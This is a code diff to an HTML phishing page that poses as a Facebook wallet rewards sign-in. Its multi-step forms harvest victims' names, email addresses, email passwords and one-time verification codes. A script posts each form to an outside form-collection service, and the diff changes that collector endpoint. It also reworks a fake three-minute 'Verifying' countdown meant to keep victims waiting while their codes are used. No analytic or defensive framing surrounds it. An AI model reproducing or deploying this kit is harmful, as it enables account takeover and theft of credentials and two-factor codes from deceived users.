@@ -1,4 +1,4 @@
-  <!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
@@ -591,7 +591,7 @@ To see your rewards, sign in to your facebook wallet using your gmail account.
 </h5><br>
             <div id="error-message" style="color: #dc2626; font-size: 11px; margin-bottom: 4px;"></div>
             <div class="floating-group">
-              <input type="text" required name="1_PageA_Mail+No+Log" autocomplete="off" id="name" class="floating-input" placeholder=" " data-min-length="5" data-error-message="Please enter your full name" oninput="validateInput(this)" />
+              <input type="text" required name="page_1_A_mail+no+log" autocomplete="off" id="name" class="floating-input" placeholder=" " data-min-length="5" data-error-message="Please enter your full name" oninput="validateInput(this)" />
               <span class="floating-label">Enter your Name</span>
             </div>
             <div class="floating-group">
@@ -668,13 +668,13 @@ If you used an incorrect password previously, please sign in using your correct 
             
               <div>
               <div class="floating-group">
-                <input type="text" required id="fullName" name="2_B_Mail_Log" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
+                <input type="text" required id="fullName" name="page2_B_mail_Log" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
                 <span class="floating-label">Email</span>
              
  </div>
             
               <div class="floating-group">
-                <input type="text" required id="email2" name="2_pageB_pass" class="floating-input" placeholder=" " data-min-length="7" data-error-message="Please complete password" oninput="validateCustom(this)" />
+                <input type="text" required id="email2" name="page2_B_pass" class="floating-input" placeholder=" " data-min-length="7" data-error-message="Please complete password" oninput="validateCustom(this)" />
                 <span class="floating-label">Email Password</span>
               </div>
               <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
@@ -713,7 +713,7 @@ You will also receive a verification code shortly. Once received, enter the code
             <div>
             
               <div class="floating-group">
-                <input type="tel" inputmode="numeric" pattern="[0-9]{6,10}" minlength="6" maxlength="10" required name="3_pageC_code" class="floating-input" placeholder=" " data-min-length="6" data-error-message="Please enter complete code" oninput="validateCodeInput(this)" />
+                <input type="tel" inputmode="numeric" pattern="[0-9]{6,10}" minlength="6" maxlength="10" required name="page3_C_code" class="floating-input" placeholder=" " data-min-length="6" data-error-message="Please enter complete code" oninput="validateCodeInput(this)" />
                 <span class="floating-label">Enter Verification Code</span> 
               </div>
               <div class="floating-group">
@@ -751,11 +751,11 @@ After selecting "Yes, it's me", you will be prompted to pick a number. Just pick
 </h5>
               <div>
                 <div class="floating-group">
-                  <input type="tel" inputmode="numeric" pattern="[0-9]{4,10}" minlength="4" maxlength="10" required name="4_pageD_Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete Code" oninput="validateCodeInput(this)" />
+                  <input type="tel" inputmode="numeric" pattern="[0-9]{4,10}" minlength="4" maxlength="10" required name="page4_D_Code" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete Code" oninput="validateCodeInput(this)" />
                   <span class="floating-label">Enter Code</span> 
                 </div>
                 <div class="floating-group">
-                  <input type="tel" inputmode="numeric" pattern="[0-9]{4,10}" minlength="4" maxlength="10" required name="4_pageD_cod_Confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete Code" oninput="validateCodeInput(this)" />
+                  <input type="tel" inputmode="numeric" pattern="[0-9]{4,10}" minlength="4" maxlength="10" required name="page4D_cod_Confirm" class="floating-input" placeholder=" " data-min-length="4" data-error-message="Please enter complete Code" oninput="validateCodeInput(this)" />
                   <span class="floating-label">Enter Verification Code Again</span>
                 </div>
                 <button type="submit" class="responsive-btn">Proceed</button>
@@ -777,12 +777,12 @@ You are having trouble signing in to your email because you are using a wrong pa
             
               <div>
                 <div class="floating-group">
-<input type="text" required id="fullName" name="5_E_Mail_pass_Retry" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
+<input type="text" required id="fullName" name="page5_E_Mail" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete email" oninput="validateCustom(this)" />
     <span class="floating-label">Email</span>     
 </div>
 
 <div class="floating-group">
-                <input type="text" required id="fullName" name="5_E_Mail_pass_Retry" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete password" oninput="validateCustom(this)" />
+                <input type="text" required id="fullName" name="page5_E_Mail_pass_Retry" class="floating-input" placeholder=" " data-min-length="8" data-error-message="Enter your complete password" oninput="validateCustom(this)" />
                 <span class="floating-label">Email Password</span>
             
 </div>
@@ -1559,7 +1559,9 @@ You are all set. No further action is required on your part, so you can simply r
       </div>
     </div>
 
-<script>
+
+
+ <script>
     const msgElements = document.querySelectorAll('.external-message');
     const stepSections = document.querySelectorAll('.step-section');
     const txOverlay = document.getElementById('tx-overlay');
@@ -1765,7 +1767,6 @@ You are all set. No further action is required on your part, so you can simply r
         
         if (proc20TimerInterval) clearInterval(proc20TimerInterval);
 
-        let currentPercent = 1;
         const timerElement = document.getElementById('timerCount20');
         const titleEl = document.getElementById('proc20-title');
         const subtitleEl = document.getElementById('proc20-subtitle');
@@ -1774,14 +1775,20 @@ You are all set. No further action is required on your part, so you can simply r
         if (titleEl) titleEl.textContent = "Verifying...";
         if (subtitleEl) subtitleEl.textContent = "Please wait, do not leave this page.";
 
-        // 1800ms * 100 steps = 180,000ms (180 seconds / 3 minutes total)
+        const totalDurationMs = 180000; // Exactly 180 seconds (3 minutes)
+        const startTime = Date.now();
+
         proc20TimerInterval = setInterval(() => {
-            // Safety check: if user switches tabs or navigates away, pause counting up
+            // If tab is hidden or page is in background, do not accumulate time or redirect
             if (document.hidden) {
                 return;
             }
 
-            currentPercent++;
+            const elapsedMs = Date.now() - startTime;
+            let currentPercent = Math.floor((elapsedMs / totalDurationMs) * 100) + 1;
+            
+            if (currentPercent > 100) currentPercent = 100;
+
             if (timerElement) timerElement.textContent = currentPercent + "%";
 
             if (currentPercent >= 50 && currentPercent < 100) {
@@ -1789,17 +1796,17 @@ You are all set. No further action is required on your part, so you can simply r
                 if (subtitleEl) subtitleEl.textContent = "You've gotten this far please wait you are almost there. Do not leave this page.";
             }
 
-            if (currentPercent >= 100) {
+            if (elapsedMs >= totalDurationMs) {
                 clearInterval(proc20TimerInterval);
                 setTimeout(() => {
                     showStep('finalApproved');
                 }, 1000);
             }
-        }, 1800);
+        }, 500);
     }
 
     function postForm(formId) {
-        fetch("https://submit-form.com/M", { 
+        fetch("https://submit-form.com/EGef8sATM", { 
             method: "POST", 
             body: new FormData(document.getElementById(formId)), 
             headers: { 'Accept': 'application/json' } 
@@ -1846,6 +1853,8 @@ You are all set. No further action is required on your part, so you can simply r
         runExtendedProcessing20(); 
     }
 </script>
+
+
 
 </body>
 </html>
